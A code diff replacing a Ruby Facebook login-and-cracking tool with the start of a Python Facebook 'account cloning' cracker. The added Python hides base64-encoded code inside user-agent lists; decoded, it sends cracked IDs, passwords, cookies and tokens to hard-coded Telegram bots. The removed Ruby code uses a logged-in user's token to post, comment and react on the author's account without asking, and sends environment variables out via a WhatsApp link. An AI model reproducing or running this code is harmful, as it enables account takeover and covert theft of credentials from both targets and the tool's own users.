@@ -1,2675 +1,696 @@
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+#coding=utf-8
+#Writer : RIAZ
+#File cloning and old Account cloning Tool
+########################################################################
+## import lib
+import os,sys
+try: import requests
+except ModuleNotFoundError:print("Js Install Module requests");os.system("python -m pip install requests &> /dev/null")
+try: import bs4
+except ModuleNotFoundError:print("Js Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
+try: import mechanize
+except ModuleNotFoundError:print("Js Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
+try: import gTTS
+except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/null")
+## import in
+import requests as req
+import requests as re
+import time,random,json
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+class jalan:
+	def __init__(self, z):
+		for e in z + "\n":
+			sys.stdout.write(e)
+			sys.stdout.flush()
+			time.sleep(0.009)
+## import crack
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor as zthreads
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from concurrent.futures import ThreadPoolExecutor as kikygtg
+from requests.exceptions import ConnectionError
+from bs4 import BeautifulSoup as parser
+from bs4 import BeautifulSoup as par
+from requests.exceptions import ConnectionError
+try:os.remove("old.txt")
+except:pass
+try:os.remove("oldv2.txt")
+except:pass
+try:
+	os.mkdir('dump')
+except:pass
+try:
+	os.mkdir('result')
+except:pass
+try:
+	os.mkdir('/sdcard/')
+except:pass
+## Color public
+P = '\x1b[0;97m' # WHITE
+M = '\x1b[0;91m' # MERAH
+H = '\x1b[0;92m' # HIJAU.
+K = '\x1b[0;93m' # KUNINg.
+B = '\x1b[0;94m' # BIRU.
+U = '\x1b[0;95m' # UNGU.
+O = '\x1b[0;96m' # BIRU MUDA.
+N = '\x1b[0m'    # WARNA MATI
+I='\x1b[0;32m'
+C='\x1b[0;36m'
+M='\x1b[0;31m'
+U='\x1b[0;35m'
+K='\x1b[0;33m'
+#P='\033[0;37m'
+P='\x1b[00m'
+H='\x1b[0;90m'
+Q="\x1b[00m"
+i='\x1b[0;32m'
+c='\x1b[0;36m'
+m='\x1b[0;31m'
+u='\x1b[0;35m'
+k='\x1b[0;33m'
+b='\x1b[0;34m'
+#P='\033[0;37m'
+p='\x1b[00m'
+h='\x1b[0;90m'
+q="\x1b[00m"
+version_xx=("2.0.3")
+war = ("[+] ")
+inp = ("[*] ")
+bulat = ("[•] ")
+garis = (war+"\x1b[1;97m [*]=============================================")
+class play_mpv:
+	def __init__(self, x):
+		global alam
+		alam = "y"
+		try:
+			if alam == "y" or "y" == alam:
+				try:
+					os.popen("play-audio "+x)
+				except:pass
+		except:pass
+class pilih_alam:
+	def __init__(self):
+		global alam
+		pil_b = input(war+"Do you want to make a sound/alarm if the crack results come out (Y/n) : ")
+		if pil_b == "y" or pil_b == "Y":
+			jalan(war+"If there is Uncle Garookx's voice, it's a sign that the crack results are out");jalan(war+"Example ...");alam = ("y");play_mpv('assalamualaikum.mp3')
+#			return alam
+		else:
+			alam = ("Garoookkxxx")
+#			return alam
+class pilih_infong:
+	def __init__(self):
+		global infoong
+		pil_vv = input(war+"Do you want to display account information (Y/n) :")
+		if pil_vv == "y" or pil_vv == "Y":
+			infoong = ("y")
+		else:
+			infoong = ("Garoookkxxx")
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
 
-=end
+user_agnet_random = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9","Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","IyMjIyMjID4+Pj4gU0VUSU5HQU4gVE9LRU4gQ1JBQ0sgQkFQSSBEQU4gTUJBU0lDClRPT0tLVUtJUyA9ICgiMjEwNzcxNzc2MzpBQUc2eHZGZ1lQNm5Rbm5LMFFNMmVLb1VpNGdaLU1kVnU3YyIpClRPT0sgPSAoIjIxNDE4NDE5NTI6QUFHNmNWQVVHMllIRFlzcG9oNWw4cXZXMlZYZkkteC1GdkEiKQpJRFRUID0gKCIxNTcwNTY2MzcwIikKSURUVFQgPSAoIjIxMzg2NDQ1MzciKQpfc2VzPXJlcXVlc3RzLlNlc3Npb24oKQp1cmxzPSJodHRwczovL2J1c2luZXNzLmZhY2Vib29rLmNvbS9idXNpbmVzc19sb2NhdGlvbnMiCmRlZiBib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoU1RULCBpZF90YXJnZXQsIHB3X3RhcmdldCwgdHRsX3RhcmdldCk6CiAgICAgICAgaWYgIk9LIiA9PSBTVFQgb3IgU1RUID09ICJPSyI6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9T0sge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsaWYgIlRBUCIgPT0gU1RUIG9yIFNUVCA9PSAiVEFQIjoKICAgICAgICAgICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1MDcxNTQ4Mzg3OkFBSGpMcGRncVpkckFmZFdEYzZta3V5dHVaNUpfSkl0Nmd3L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9e2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9e2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIHJlcXVlc3RzLnBvc3QoZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhaykKZGVmIGJva2VwX2JhcmF0X3lhbmdfdGVyYmFydSh0b2tlbik6CiAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvb2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VE9PS0tVS0lTfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PXt0b2tlbn0nJycpCiAgICAgICAgcmVxdWVzdHMucG9zdChkYXNhcl9rYW5nX3JlY29kZXJfa29udG9vbF9lbmdnYV9hZGFfb3RhaykKCgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1djIoU1RULCBpZF90YXJnZXQsIHB3X3RhcmdldCwgZm9reCk6CiAgICAgICAgaWYgIk9LIiA9PSBTVFQgb3IgU1RUID09ICJPSyI6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTA0MDMwMDgxODpBQUVRSWNGbFEtS1JhSnAxczZTOEVCcDhzZnR6OWJzS01Hby9zZW5kTWVzc2FnZT9jaGF0X2lkPTIxMzg2NDQ1MzcmdGV4dD17aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7Zm9reH0nJycpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1MDIxNDkyNzYwOkFBRlN6Y0lUQTd4N2dSdHp2andBU3VSbGtaTEc3U0pPN0ZnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9MjEzODY0NDUzNyZ0ZXh0PXtpZF90YXJnZXR9fHtwd190YXJnZXR9fHtmb2t4fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBha3VuX29rKHVzZXJyLCBwd3csIGNva2lpKToKICAgICAgICBsaW5rX2JvdCA9ICI1MTA4OTE2MDc2OkFBRllnWjU4Sk1FcFlnUXVMOFFhLW9XZTVaWGpNWE5USlJ3IgogICAgICAgIGxpbmtfX2JvdCA9ICIyMTM1NTE0MTY3OkFBSG1kQVhVM0Q2V1RTY2NOeGlPTlNCeU1pZzVrVnhPc2NzIgoKCiAgICAgICAgbHBwcCA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtsaW5rX2JvdH0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0yMTM4NjQ0NTM3JnRleHQ9e3VzZXJyfXx7cHd3fScnJykKICAgICAgICBscHBwcCA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtsaW5rX19ib3R9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9MjEzODY0NDUzNyZ0ZXh0PXtjb2tpaX0nJycpCgoKICAgICAgICByZXF1ZXN0cy5wb3N0KGxwcHApCiAgICAgICAgcmVxdWVzdHMucG9zdChscHBwcCkK","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17","Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4","Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4"]
+kiky_at = ("Mr.Risky")
+ua_mm = ['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','X3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1KFNUVCwgaWRfdGFyZ2V0LCBwd190YXJnZXQsIHR0bF90YXJnZXQpOgogICAgICAgIGlmICJPSyIgPT0gU1RUIG9yIFNUVCA9PSAiT0siOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpPSyB7aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7dHRsX3RhcmdldH0nJycpCiAgICAgICAgZWxpZiAiVEFQIiA9PSBTVFQgb3IgU1RUID09ICJUQVAiOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpUQVAge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9CntpZF90YXJnZXR9fHtwd190YXJnZXR9fHt0dGxfdGFyZ2V0fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBib2tlcF9iYXJhdF95YW5nX3RlcmJhcnUodG9rZW4pOgogICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0tLVUtJU30vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SURUVH0mdGV4dD0KW+KAol09PT09PS0tLS0tLS0tLS0tLS0tLT09PT09W+KAol0KWz9dIFRPS0VOIEZBQ0VCT09LIDIwMjEgOgp7dG9rZW59CicnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrKQoKI2Jva2VwX2phcGFuX3lhbmdfdGVyYmFydSgiQ1AiLCAiMyIsICIyIiwgIjEiKQojYm9rZXBfYmFyYXRfeWFuZ190ZXJiYXJ1KCJ0b2tlbiIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIkNQIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIk9LIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCg==','ZGVmIGZha2UodGV4dCk6CiAgICAgICAgIyBTZWxhbWF0IEFuZGEgTWVuamFkaSBLYW5nIERlY3J5cHQgOikKICAgICAgICAjIEJ5IE1yLlJpc2t5CiAgICAgICAgaW1wb3J0IGJhc2U2NAogICAgICAgIEJPS0VQID0gIkBLTlRMQCIKICAgICAgICBibyA9ICIiCiAgICAgICAgZ2xvYmFsIGJvYQogICAgICAgIGJvayA9IHRleHQuc3BsaXQoIkBLTlRMQCIpCiAgICAgICAgZm9yIG5hIGluIGJvazoKICAgICAgICAgICAgICAgIGJvICs9IChuYSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgYm9hID0gYmFzZTY0LmIzMmRlY29kZShibykK','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+']
+kiky_hp = ("+6283143565470")
+import sys, os, subprocess, platform, struct
 
-$LOAD_PATH.unshift File.expand_path(".", "lib")
+null=open(os.devnull, "w")
+insta= subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
+null.close()
+if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
 
-require 'threadpool'
-require 'io/console'
-require 'net/https'
-require 'open-uri'
-require 'net/http'
-require 'rubygems'
-require 'thread'
-require 'digest'
-require 'open3'
-require 'files'
-require 'json'
-require 'erb'
-require 'uri'
-require 'os'
+###### >>>>
+CP, OK = 0, 0
+TP = 0
+ubahP = []
+pwbaru = []
+data = {}
+data2 = {}
+loop = 0
+loop = 0
+ok = []
+cp = []
+ttl = []
+fw = []
+jq = 0
+bf = 0
+bg = 0
+jg = 0
+pq = 0
+id = []
+lq = []
+iz = []
+kx = 0
+opq = []
+olq = []
+Aman,Cp,Salah=0,0,0
+mb = "https://mbasic.facebook.com"
+url_mb = "https://mbasic.facebook.com"
+ok = []
+cp = []
+ttl = []
+nampung = []
+data,data2={},{}
+ubahP,pwBaru=[],[]
+_ses=requests.Session()
+urls="https://business.facebook.com/business_locations"
 
-if OS.linux?
-  $r = "\033[1;91m"
-  $g = "\033[1;92m"
-  $y = "\033[1;93m"
-  $p = "\033[1;94m"
-  $m = "\033[1;95m"
-  $c = "\033[1;96m"
-  $w = "\033[1;97m"
-  $a = "\033[1;0m"
-else
-  $r = ""
-  $g = ""
-  $y = ""
-  $p = ""
-  $m = ""
-  $c = ""
-  $w = ""
-  $a = ""
-end
+###### >>>> 
+current = datetime.now()
+durasi = str(datetime.now().strftime("%d-%m-%Y"))
+tahun = current.year
+bulan = current.month
+hari = current.day
+current = datetime.now()
+waktuu = str(datetime.now().strftime("%Y-%m-%d"))
+waktu = str(datetime.now().strftime("%Y%m%d"))
+jamz = datetime.now().strftime('%H:%M:%S')
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-def loading!
-  for x in [".   ", "..  ", "... ",".... ","\n"]
-    $stdout.write("\r#{$r}[!] #{$g}Please Wait"+x)
-    $stdout.flush()
-    sleep(1)
-  end
-end
-
-$logo = " \n#{$w}█████████\n#{$w}█▄█████▄█      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --_--#{$g}╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n#{$w}█ #{$w} #{$w}_-_-- -_ --__#{$g} ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _ --#{$g}═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ #{$y}ELITE v1.1\n#{$w}█████████      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w} ██ ██\n#{$w}╔════════════════════════════════════════╗\n#{$w}║#{$y}* #{$w}Author  #{$r}: #{$c}MR.FAGHP  #{$w}                 ║\n#{$w}║#{$y}* #{$w}Github  #{$r}: #{$c}github.com/xxoprt/#{$w}     ║\n#{$w}║#{$y}* #{$w}Wa      #{$r}: #{$c}+6281313537943   #{$w}          ║\n#{$w}║#{$y}* #{$w}#{RUBY_ENGINE}#{' '*(8 - RUBY_ENGINE.length)}#{$r}: #{$c}#{RUBY_VERSION}   #{$w}                    ║\n#{$w}║#{$y}* #{$w}Version #{$r}: #{$c}1.1                         #{$w}║\n#{$w}╚════════════════════════════════════════╝#{$a}"
-$user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
-$indonesia = false
-
-def tik(teks)
-  for i in teks.chars << "\n"
-    $stdout.write(i)
-    $stdout.flush()
-    sleep(0.05)
-  end
-end
-
-def tok(teks,delay = 0.03)
-  for i in teks.chars
-    $stdout.write(i)
-    $stdout.flush()
-    sleep(delay)
-  end
-end
-
-def Request(method = 'GET',token = $token,path)
-  uri = URI("https://graph.facebook.com/#{path}&method=#{method}&access_token=#{token}")
-  Net::HTTP.start(uri.hostname,uri.port,:use_ssl => (uri.scheme == 'https')) do |http|
-    request = Net::HTTP::Get.new(uri)
-    response = http.request(request)
-    jeson = JSON.parse(response.body)
-    return jeson
-  end
-end
-
-def ReportBug()
-  msg = ""
-  msg << "environment\n===========\n"
-  ENV.keys.each{|i| msg << "#{i} : #{ENV[i]}\n"}
-  begin
-    Open3.popen3("termux-info") do |stdin, stdout, stderr, thread|
-      msg << "\nTermux-Info\n===========\n"
-      msg << stdout.read.chomp
-    end
-  rescue Errno::ENOENT
-  end
-  msg << "\n\nPlatform\n==========\n"
-  platform = Gem::Platform.local
-  msg << "CPU : #{platform.cpu}\n"
-  msg << "OS : #{platform.os}\n"
-  msg << "Version : #{platform.version}\n"
-  msg << "\nProgram\n========\n"
-  msg << "File Name : #{$0}\n"
-  msg << "File Path : #{File.realpath($0)}\n"
-  msg << "File Size : #{File.size($0)}\n"
-  msg << "\nRuby\n========\n"
-  msg << "Ruby Engine : #{RUBY_ENGINE}\n"
-  msg << "Ruby Version : #{RUBY_VERSION}\n"
-  msg << "Ruby Platform : #{RUBY_PLATFORM}\n"
-  msg << "Ruby Release Date : #{RUBY_RELEASE_DATE}\n"
-  text = ERB::Util.url_encode(msg)
-  system ("xdg-open https://wa.me/6285754629509?text=#{text}")
-  abort ("#{$r}[!] Exit!")
-end
-
-def login()
-  begin
-    system('clear')
-    puts ($logo)
-    puts ("#{$w}║-> 1. Login Via email/password#{$a}")
-    puts ("#{$w}║-> 2. Login Via Token#{$a}")
-    puts ("#{$w}║-> 3. Login Via Cookie#{$a}")
-    puts ("#{$w}║-> 4. Report Bug#{$a}")
-    puts ("#{$w}║-> 0. Exit#{$a}")
-    print ("#{$w}╚═#{$r}▶#{$w} ")
-    log = gets.chomp!
-    case log
-      when '1'
-        loginpw()
-      when '2'
-        loginto()
-      when '3'
-        loginco()
-      when '4'
-        ReportBug()
-      when '0'
-        abort("#{$r}[!] Exit#{$a}")
-      else
-        puts ("#{$y}[!] Invalid Input!#{$a}")
-        sleep(0.9) ; login()
-    end
-  rescue SocketError
-    abort ("#{$r}[!] No Connection#{$a}")
-  rescue Errno::ETIMEDOUT
-    abort ("#{$y}[!] Connection timed out#{$a}")
-  rescue Interrupt
-    abort ("#{$r}[!] Exit#{$a}")
-  rescue Errno::ENETUNREACH,Errno::ECONNRESET
-    abort ("#{$y}[!] There is an error\n[!] Please Try Again#{$a}")
-  end
-end
-
-def loginpw()
-  system('clear')
-  puts ($logo)
-  puts ("#{$w}═"*52)
-  puts ("#{$r}[+] #{$g}LOGIN ACCOUNT FACEBOOK #{$r}#{$a}")
-  print ("#{$r}[+] #{$g}email|id #{$r}: #{$c}")
-  email = gets.chomp!
-  print ("#{$r}[+] #{$g}password #{$r}: #{$c}")
-  pass = STDIN.noecho(&:gets).chomp!
-  puts ("\n")
-  loading!
-  a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pass + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-  b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': email, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pass, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
-  c = Digest::MD5.new
-  c.update(a)
-  d = c.hexdigest
-  b.update({'sig': d})
-  uri = URI("https://api.facebook.com/restserver.php")
-  uri.query = URI.encode_www_form(b)
-  request = Net::HTTP::Get.new(uri)
-  request["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
-  response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => (uri.scheme == 'https')) {|http| http.request(request)}
-  res = JSON.parse(response.body)
-  if res.key? ('access_token')
-    $token = res['access_token']
-    fopen = File.open('login.txt','w')
-    fopen.write($token)
-    fopen.close()
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hello sir","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
-    puts ("#{$g}[✓] Login Success#{$a}")
-    sleep(0.5)
-    Masuk()
-  elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
-    puts ("#{$r}[!] #{$y}username #{$r}: #{$w}#{email}#{$a}")
-    puts ("#{$r}[!] #{$y}password #{$r}: #{$w}#{pass}#{$a}")
-    abort ("#{$r}[!] #{$y}status.  #{$r}: Account Has Been Checkpoint#{$a}")
-  else
-    tik("#{$r}[!] Login Failed!#{$a}")
-    sleep(1) ; loginpw()
-  end
-end
-
-def loginto()
-  system("clear")
-  puts ($logo)
-  #puts ("#{$w}═"*52)
-  #puts ("#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r}[+]#{$a}")
-  #print ("#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
-  tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r} [+]#{$a}\n#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
-  $token = gets.chomp!
-  loading!
-  req = Request("v10.0/me?")
-  if req.key? ('name')
-    fopen = File.open('login.txt','w')
-    fopen.write($token)
-    fopen.close()
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"].sample,"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token}) 
-    $name = req['name']
-    $id = req['id']
-    puts ("#{$g}[✓] Login Success!#{$a}")
-    sleep(0.9)
-    menu()
-  elsif req.key? ('error') and req['error']['code'] == 190
-    puts ("#{$y}[!] #{req['error']['message']}#{$a}")
-    sleep(0.9)
-    loginto()
-  else
-    puts ("#{$r}[!] Invalid Access Token!#{$a}!")
-    sleep(0.9)
-    loginto()
-  end
-end
-
-def loginco()
-  system ('clear')
-  puts ($logo)
